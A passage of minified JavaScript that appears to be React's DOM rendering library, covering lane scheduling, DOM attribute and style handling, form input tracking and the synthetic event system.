16384:case 32768:case 65536:case 131072:return t&-t;case 262144:case 524288:case 1048576:case 2097152:return t&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return t&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return t}}function vr(t,n,a){var r=t.pendingLanes;if(r===0)return 0;var l=0,u=t.suspendedLanes,g=t.pingedLanes;t=t.warmLanes;var R=r&134217727;return R!==0?(r=R&~u,r!==0?l=ca(r):(g&=R,g!==0?l=ca(g):a||(a=R&~t,a!==0&&(l=ca(a))))):(R=r&~u,R!==0?l=ca(R):g!==0?l=ca(g):a||(a=r&~t,a!==0&&(l=ca(a)))),l===0?0:n!==0&&n!==l&&(n&u)===0&&(u=l&-l,a=n&-n,u>=a||u===32&&(a&4194048)!==0)?n:l}function za(t,n){return(t.pendingLanes&~(t.suspendedLanes&~t.pingedLanes)&n)===0}function Hi(t,n){(n&8)!==0&&(n|=n&32);var a=t.entangledLanes;if(a!==0)for(t=t.entanglements,a&=n;0<a;){var r=31-ue(a),l=1<<r;n|=t[r],a&=~l}return n}function lo(t,n){switch(t){case 1:case 2:case 4:case 8:case 64:return n+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function co(){var t=Ia;return Ia<<=1,(Ia&62914560)===0&&(Ia=4194304),t}function ts(t){for(var n=[],a=0;31>a;a++)n.push(t);return n}function Gi(t,n){t.pendingLanes|=n,n!==268435456&&(t.suspendedLanes=0,t.pingedLanes=0,t.warmLanes=0)}function Tl(t,n,a,r,l,u){var g=t.pendingLanes;t.pendingLanes=a,t.suspendedLanes=0,t.pingedLanes=0,t.warmLanes=0,t.expiredLanes&=a,t.entangledLanes&=a,t.errorRecoveryDisabledLanes&=a,t.shellSuspendCounter=0;var R=t.entanglements,I=t.expirationTimes,Q=t.hiddenUpdates;for(a=g&~a;0<a;){var ct=31-ue(a),yt=1<<ct;R[ct]=0,I[ct]=-1;var Z=Q[ct];if(Z!==null)for(Q[ct]=null,ct=0;ct<Z.length;ct++){var st=Z[ct];st!==null&&(st.lane&=-536870913)}a&=~yt}r!==0&&xr(t,r,0),u!==0&&l===0&&t.tag!==0&&(t.suspendedLanes|=u&~(g&~n))}function xr(t,n,a){t.pendingLanes|=n,t.suspendedLanes&=~n;var r=31-ue(n);t.entangledLanes|=n,t.entanglements[r]=t.entanglements[r]|1073741824|a&261930}function uo(t,n){var a=t.entangledLanes|=n;for(t=t.entanglements;a;){var r=31-ue(a),l=1<<r;l&n|t[r]&n&&(t[r]|=n),a&=~l}}function fo(t,n){var a=n&-n;return a=(a&42)!==0?1:ho(a),(a&(t.suspendedLanes|n))!==0?0:a}function ho(t){switch(t){case 2:t=1;break;case 8:t=4;break;case 32:t=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:t=128;break;case 268435456:t=134217728;break;default:t=0}return t}function po(t){return t&=-t,2<t?8<t?(t&134217727)!==0?32:268435456:8:2}function Al(){var t=Rt.p;return t!==0?t:(t=window.event,t===void 0?32:rv(t.type))}function Rl(t,n){var a=Rt.p;try{return Rt.p=t,n()}finally{Rt.p=a}}var hi=Math.random().toString(36).slice(2),A="__reactFiber$"+hi,H="__reactProps$"+hi,dt="__reactContainer$"+hi,at="__reactEvents$"+hi,rt="__reactListeners$"+hi,Ht="__reactHandles$"+hi,qt="__reactResources$"+hi,Pt="__reactMarker$"+hi,Kt="__reactLoad$"+hi;function jt(t){delete t[A],delete t[H],delete t[rt],delete t[Ht]}function re(t){var n;if(n=t[A])return n;for(var a=t.parentNode;a;){if(n=a[dt]||a[A]){if(a=n.alternate,n.child!==null||a!==null&&a.child!==null)for(t=F_(t);t!==null;){if(a=t[A])return a;t=F_(t)}return n}t=a,a=t.parentNode}return null}function fe(t){if(t=t[A]||t[dt]){var n=t.tag;if(n===5||n===6||n===13||n===31||n===26||n===27||n===3)return t}return null}function Yt(t){var n=t.tag;if(n===5||n===26||n===27||n===6)return t.stateNode;throw Error(s(33))}function ye(t){var n=t[qt];return n||(n=t[qt]={hoistableStyles:new Map,hoistableScripts:new Map}),n}function _e(t){t[Pt]=!0}function Ye(t){t[Kt]=void 0}var He=new Set,vn={};function Gt(t,n){an(t,n),an(t+"Capture",n)}function an(t,n){for(vn[t]=n,t=0;t<n.length;t++)He.add(n[t])}var Ce=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),zn={},ei={};function Vi(t){return Et.call(ei,t)?!0:Et.call(zn,t)?!1:Ce.test(t)?ei[t]=!0:(zn[t]=!0,!1)}var ve=!1;function Be(){var t=ve;return ve=!1,t}function je(t,n,a){if(Vi(n))if(a===null)t.removeAttribute(n);else{switch(typeof a){case"undefined":case"function":case"symbol":t.removeAttribute(n);return;case"boolean":var r=n.toLowerCase().slice(0,5);if(r!=="data-"&&r!=="aria-"){t.removeAttribute(n);return}}t.setAttribute(n,a)}}function ni(t,n,a){if(a===null)t.removeAttribute(n);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":t.removeAttribute(n);return}t.setAttribute(n,a)}}function be(t,n,a,r){if(r===null)t.removeAttribute(a);else{switch(typeof r){case"undefined":case"function":case"symbol":case"boolean":t.removeAttribute(a);return}t.setAttributeNS(n,a,r)}}function rn(t){switch(typeof t){case"bigint":case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function ua(t){var n=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Cl(t,n,a){var r=Object.getOwnPropertyDescriptor(t.constructor.prototype,n);if(!t.hasOwnProperty(n)&&typeof r<"u"&&typeof r.get=="function"&&typeof r.set=="function"){var l=r.get,u=r.set;return Object.defineProperty(t,n,{configurable:!0,get:function(){return l.call(this)},set:function(g){a=""+g,u.call(this,g)}}),Object.defineProperty(t,n,{enumerable:r.enumerable}),{getValue:function(){return a},setValue:function(g){a=""+g},stopTracking:function(){t._valueTracker=null,delete t[n]}}}}function Gu(t){if(!t._valueTracker){var n=ua(t)?"checked":"value";t._valueTracker=Cl(t,n,""+t[n])}}function cm(t){if(!t)return!1;var n=t._valueTracker;if(!n)return!0;var a=n.getValue(),r="";return t&&(r=ua(t)?t.checked?"true":"false":t.value),t=r,t!==a?(n.setValue(t),!0):!1}var bS=/[\n"\\]/g;function pi(t){return t.replace(bS,function(n){return"\\"+n.charCodeAt(0).toString(16)+" "})}function Vu(t,n,a,r,l,u,g,R){t.name="",g!=null&&typeof g!="function"&&typeof g!="symbol"&&typeof g!="boolean"?t.type=g:t.removeAttribute("type"),n!=null?g==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+rn(n)):t.value!==""+rn(n)&&(t.value=""+rn(n)):g!=="submit"&&g!=="reset"||t.removeAttribute("value"),n!=null?g==="number"&&t.value==n?Xu(t,rn(t.value)):Xu(t,rn(n)):a!=null?Xu(t,rn(a)):r!=null&&t.removeAttribute("value"),l==null&&u!=null&&(t.defaultChecked=!!u),l!=null&&(t.checked=l&&typeof l!="function"&&typeof l!="symbol"),R!=null&&typeof R!="function"&&typeof R!="symbol"&&typeof R!="boolean"?t.name=""+rn(R):t.removeAttribute("name")}function um(t,n,a,r,l,u,g,R){if(u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"&&(t.type=u),n!=null||a!=null){if(!(u!=="submit"&&u!=="reset"||n!=null)){Gu(t);return}a=a!=null?""+rn(a):"",n=n!=null?""+rn(n):a,R||n===t.value||(t.value=n),t.defaultValue=n}r=r??l,r=typeof r!="function"&&typeof r!="symbol"&&!!r,t.checked=R?t.checked:!!r,t.defaultChecked=!!r,g!=null&&typeof g!="function"&&typeof g!="symbol"&&typeof g!="boolean"&&(t.name=g),Gu(t)}function Xu(t,n){t.defaultValue!==""+n&&(t.defaultValue=""+n)}function es(t,n,a,r){if(t=t.options,n){n={};for(var l=0;l<a.length;l++)n["$"+a[l]]=!0;for(a=0;a<t.length;a++)l=n.hasOwnProperty("$"+t[a].value),t[a].selected!==l&&(t[a].selected=l),l&&r&&(t[a].defaultSelected=!0)}else{for(a=""+rn(a),n=null,l=0;l<t.length;l++){if(t[l].value===a){t[l].selected=!0,r&&(t[l].defaultSelected=!0);return}n!==null||t[l].disabled||(n=t[l])}n!==null&&(n.selected=!0)}}function fm(t,n,a){if(n!=null&&(n=""+rn(n),n!==t.value&&(t.value=n),a==null)){t.defaultValue!==n&&(t.defaultValue=n);return}t.defaultValue=a!=null?""+rn(a):""}function dm(t,n,a,r){if(n==null){if(r!=null){if(a!=null)throw Error(s(92));if(wt(r)){if(1<r.length)throw Error(s(93));r=r[0]}a=r}a==null&&(a=""),n=a}a=rn(n),t.defaultValue=a,r=t.textContent,r===a&&r!==""&&r!==null&&(t.value=r),Gu(t)}function ns(t,n){if(n){var a=t.firstChild;if(a&&a===t.lastChild&&a.nodeType===3){a.nodeValue=n;return}}t.textContent=n}var TS=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function hm(t,n,a){var r=n.indexOf("--")===0;a==null||typeof a=="boolean"||a===""?r?t.setProperty(n,""):n==="float"?t.cssFloat="":t[n]="":r?t.setProperty(n,a):typeof a!="number"||a===0||TS.has(n)?n==="float"?t.cssFloat=a:t[n]=(""+a).trim():t[n]=a+"px"}function pm(t,n,a){if(n!=null&&typeof n!="object")throw Error(s(62));if(t=t.style,a!=null){for(var r in a)!a.hasOwnProperty(r)||n!=null&&n.hasOwnProperty(r)||(r.indexOf("--")===0?t.setProperty(r,""):r==="float"?t.cssFloat="":t[r]="",ve=!0);for(var l in n)r=n[l],n.hasOwnProperty(l)&&a[l]!==r&&(hm(t,l,r),ve=!0)}else for(var u in n)n.hasOwnProperty(u)&&hm(t,u,n[u])}function ku(t){if(t.indexOf("-")===-1)return!1;switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var AS=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["maskType","mask-type"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),RS=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function wl(t){return RS.test(""+t)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":t}function Xi(){}var Wu=null;function qu(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var is=null,as=null;function mm(t){var n=fe(t);if(n&&(t=n.stateNode)){var a=t[H]||null;t:switch(t=n.stateNode,n.type){case"input":if(Vu(t,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name),n=a.name,a.type==="radio"&&n!=null){for(a=t;a.parentNode;)a=a.parentNode;for(a=a.querySelectorAll('input[name="'+pi(""+n)+'"][type="radio"]'),n=0;n<a.length;n++){var r=a[n];if(r!==t&&r.form===t.form){var l=r[H]||null;if(!l)throw Error(s(90));Vu(r,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name)}}for(n=0;n<a.length;n++)r=a[n],r.form===t.form&&cm(r)}break t;case"textarea":fm(t,a.value,a.defaultValue);break t;case"select":n=a.value,n!=null&&es(t,!!a.multiple,n,!1)}}}var Yu=!1;function gm(t,n,a){if(Yu)return t(n,a);Yu=!0;try{var r=t(n);return r}finally{if(Yu=!1,(is!==null||as!==null)&&(wc(),is&&(n=is,t=as,as=is=null,mm(n),t)))for(n=0;n<t.length;n++)mm(t[n])}}function mo(t,n){var a=t.stateNode;if(a===null)return null;var r=a[H]||null;if(r===null)return null;a=r[n];t:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break t;default:t=!1}if(t)return null;if(a&&typeof a!="function")throw Error(s(231,n,typeof a));return a}var fa=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Zu=!1;if(fa)try{var go={};Object.defineProperty(go,"passive",{get:function(){Zu=!0}}),window.addEventListener("test",go,go),window.removeEventListener("test",go,go)}catch{Zu=!1}var Ba=null,Ku=null,Nl=null;function _m(){if(Nl)return Nl;var t,n=Ku,a=n.length,r,l="value"in Ba?Ba.value:Ba.textContent,u=l.length;for(t=0;t<a&&n[t]===l[t];t++);var g=a-t;for(r=1;r<=g&&n[a-r]===l[u-r];r++);return Nl=l.slice(t,1<r?1-r:void 0)}function Dl(t){var n=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&n===13&&(t=13)):t=n,t===10&&(t=13),32<=t||t===13?t:0}function Ul(){return!0}function vm(){return!1}function Bn(t){function n(a,r,l,u,g){this._reactName=a,this._targetInst=l,this.type=r,this.nativeEvent=u,this.target=g,this.currentTarget=null;for(var R in t)t.hasOwnProperty(R)&&(a=t[R],this[R]=a?a(u):u[R]);return this.isDefaultPrevented=(u.defaultPrevented!=null?u.defaultPrevented:u.returnValue===!1)?Ul:vm,this.isPropagationStopped=vm,this}return P(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():typeof a.returnValue!="unknown"&&(a.returnValue=!1),this.isDefaultPrevented=Ul)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():typeof a.cancelBubble!="unknown"&&(a.cancelBubble=!0),this.isPropagationStopped=Ul)},persist:function(){},isPersistent:Ul}),n}var Fa={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ll=Bn(Fa),_o=P({},Fa,{view:0,detail:0}),CS=Bn(_o),ju,Qu,vo,Ol=P({},_o,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:$u,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==vo&&(vo&&t.type==="mousemove"?(ju=t.screenX-vo.screenX,Qu=t.screenY-vo.screenY):Qu=ju=0,vo=t),ju)},movementY:function(t){return"movementY"in t?t.movementY:Qu}}),xm=Bn(Ol),wS=P({},Ol,{dataTransfer:0}),NS=Bn(wS),DS=P({},_o,{relatedTarget:0}),Ju=Bn(DS),US=P({},Fa,{animationName:0,elapsedTime:0,pseudoElement:0}),LS=Bn(US),OS=P({},Fa,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),PS=Bn(OS),IS=P({},Fa,{data:0}),Sm=Bn(IS),zS={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},BS={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},FS={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function HS(t){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(t):(t=FS[t])?!!n[t]:!1}function $u(){return HS}var GS=P({},_o,{key:function(t){if(t.key){var n=zS[t.key]||t.key;if(n!=="Unidentified")return n}return t.type==="keypress"?(t=Dl(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?BS[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:$u,charCode:function(t){return t.type==="keypress"?Dl(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Dl(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),VS=Bn(GS),XS=P({},Ol,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ym=Bn(XS),kS=P({},Fa,{submitter:0}),WS=Bn(kS),qS=P({},_o,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:$u}),YS=Bn(qS),ZS=P({},Fa,{propertyName:0,elapsedTime:0,pseudoElement:0}),KS=Bn(ZS),jS=P({},Ol,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),QS=Bn(jS),JS=P({},Fa,{newState:0,oldState:0,source:0}),$S=Bn(JS),ty=[9,13,27,32],tf=fa&&"CompositionEvent"in window,xo=null;fa&&"documentMode"in document&&(xo=document.documentMode);var ey=fa&&"TextEvent"in window&&!xo,Mm=fa&&(!tf||xo&&8<xo&&11>=xo),Em=" ",bm=!1;function Tm(t,n){switch(t){case"keyup":return ty.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Am(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var rs=!1;function ny(t,n){switch(t){case"compositionend":return Am(n);case"keypress":return n.which!==32?null:(bm=!0,Em);case"textInput":return t=n.data,t===Em&&bm?null:t;default:return null}}function iy(t,n){if(rs)return t==="compositionend"||!tf&&Tm(t,n)?(t=_m(),Nl=Ku=Ba=null,rs=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return Mm&&n.locale!=="ko"?null:n.data;default:return null}}var ay={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Rm(t){var n=t&&t.nodeName&&t.nodeName.toLowerCase();return n==="input"?!!ay[t.type]:n==="textarea"}function Cm(t,n,a,r){is?as?as.push(r):as=[r]:is=r,n=Pc(n,"onChange"),0<n.length&&(a=new Ll("onChange","change",null,a,r),t.push({event:a,listeners:n}))}var So=null,yo=null;function ry(t){m_(t,0)}function Pl(t){var n=Yt(t);if(cm(n))return t}function wm(t,n){if(t==="change")return n}var Nm=!1;if(fa){var ef;if(fa){var nf="oninput"in document;if(!nf){var Dm=document.createElement("div");Dm.setAttribute("oninput","return;"),nf=typeof Dm.oninput=="function"}ef=nf}else ef=!1;Nm=ef&&(!document.documentMode||9<document.documentMode)}function Um(){So&&(So.detachEvent("onpropertychange",Lm),yo=So=null)}function Lm(t){if(t.propertyName==="value"&&Pl(yo)){var n=[];Cm(n,yo,t,qu(t)),gm(ry,n)}}function sy(t,n,a){t==="focusin"?(Um(),So=n,yo=a,So.attachEvent("onpropertychange",Lm)):t==="focusout"&&Um()}function oy(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Pl(yo)}function ly(t,n){if(t==="click")return Pl(n)}function cy(t,n){if(t==="input"||t==="change")return Pl(n)}function uy(t,n){return t===n&&(t!==0||1/t===1/n)||t!==t&&n!==n}var ii=typeof Object.is=="function"?Object.is:uy;function Mo(t,n){if(ii(t,n))return!0;if(typeof t!="object"||t===null||typeof n!="object"||n===null)return!1;var a=Object.keys(t),r=Object.keys(n);if(a.length!==r.length)return!1;for(r=0;r<a.length;r++){var l=a[r];if(!Et.call(n,l)||!ii(t[l],n[l]))return!1}return!0}function af(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Om(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Pm(t,n){var a=Om(t);t=0;for(var r;a;){if(a.nodeType===3){if(r=t+a.textContent.length,t<=n&&r>=n)return{node:a,offset:n-t};t=r}t:{for(;a;){if(a.nextSibling){a=a.nextSibling;break t}a=a.parentNode}a=void 0}a=Om(a)}}function Im(t,n){return t&&n?t===n?!0:t&&t.nodeType===3?!1:n&&n.nodeType===3?Im(t,n.parentNode):"contains"in t?t.contains(n):t.compareDocumentPosition?!!(t.compareDocumentPosition(n)&16):!1:!1}function zm(t){t=t!=null&&t.ownerDocument!=null&&t.ownerDocument.defaultView!=null?t.ownerDocument.defaultView:window;for(var n=af(t.document);n instanceof t.HTMLIFrameElement;){try{var a=typeof n.contentWindow.location.href=="string"}catch{a=!1}if(a)t=n.contentWindow;else break;n=af(t.document)}return n}function rf(t){var n=t&&t.nodeName&&t.nodeName.toLowerCase();return n&&(n==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||n==="textarea"||t.contentEditable==="true")}var fy=fa&&"documentMode"in document&&11>=document.documentMode,ss=null,sf=null,Eo=null,of=!1;function Bm(t,n,a){var r=a.window===a?a.document:a.nodeType===9?a:a.ownerDocument;of||ss==null||ss!==af(r)||(r=ss,"selectionStart"in r&&rf(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Eo&&Mo(Eo,r)||(Eo=r,r=Pc(sf,"onSelect"),0<r.length&&(n=new Ll("onSelect","select",null,n,a),t.push({event:n,listeners:r}),n.target=ss)))}function Sr(t,n){var a={};return a[t.toLowerCase()]=n.toLowerCase(),a["Webkit"+t]="webkit"+n,a["Moz"+t]="moz"+n,a}var os={animationend:Sr("Animation","AnimationEnd"),animationiteration:Sr("Animation","AnimationIteration"),animationstart:Sr("Animation","AnimationStart"),transitionrun:Sr("Transition","TransitionRun"),transitionstart:Sr("Transition","TransitionStart"),transitioncancel:Sr("Transition","TransitionCancel"),transitionend:Sr("Transition","TransitionEnd")},lf={},Fm={};fa&&(Fm=document.createElement("div").style,"AnimationEvent"in window||(delete os.animationend.animation,delete os.animationiteration.animation,delete os.animationstart.animation),"TransitionEvent"in window||delete os.transitionend.transition);function yr(t){if(lf[t])return lf[t];if(!os[t])return t;var n=os[t],a;for(a in n)if(n.hasOwnProperty(a)&&a in Fm)return lf[t]=n[a];return t}var Hm=yr("animationend"),Gm=yr("animationiteration"),Vm=yr("animationstart"),dy=yr("transitionrun"),hy=yr("transitionstart"),py=yr("transitioncancel"),Xm=yr("transitionend"),km=new Map,cf="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error fullscreenChange fullscreenError gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");cf.push("scrollEnd");function Ri(t,n){km.set(t,n),Gt(n,[t])}var my=0;function da(t,n){if(t.name!=null&&t.name!=="auto")return t.name;if(n.autoName!==null)return n.autoName;t=Di.identifierPrefix;var a=my++;return t="_"+t+"t_"+a.toString(32)+"_",n.autoName=t}function Wm(t){if(t==null||typeof t=="string")return t;var n=null,a=Rs;if(a!==null)for(var r=0;r<a.length;r++){var l=t[a[r]];if(l!=null){if(l==="none")return"none";n=n==null?l:n+(" "+l)}}return n??t.default}function ha(t,n){return t=Wm(t),n=Wm(n),n==null?t==="auto"?null:t:n==="auto"?null:n}var Il=typeof reportError=="function"?reportError:function(t){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var n=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof t=="object"&&t!==null&&typeof t.message=="string"?String(t.message):String(t),error:t});if(!window.dispatchEvent(n))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",t);return}console.error(t)},mi=[],ls=0,uf=0;function zl(){for(var t=ls,n=uf=ls=0;n<t;){var a=mi[n];mi[n++]=null;var r=mi[n];mi[n++]=null;var l=mi[n];mi[n++]=null;var u=mi[n];if(mi[n++]=null,r!==null&&l!==null){var g=r.pending;g===null?l.next=l:(l.next=g.next,g.next=l),r.pending=l}u!==0&&qm(a,l,u)}}function Bl(t,n,a,r){mi[ls++]=t,mi[ls++]=n,mi[ls++]=a,mi[ls++]=r,uf|=r,t.lanes|=r,t=t.alternate,t!==null&&(t.lanes|=r)}function ff(t,n,a,r){return Bl(t,n,a,r),Fl(t)}function Mr(t,n){return Bl(t,null,null,n),Fl(t)}function qm(t,n,a){t.lanes|=a;var 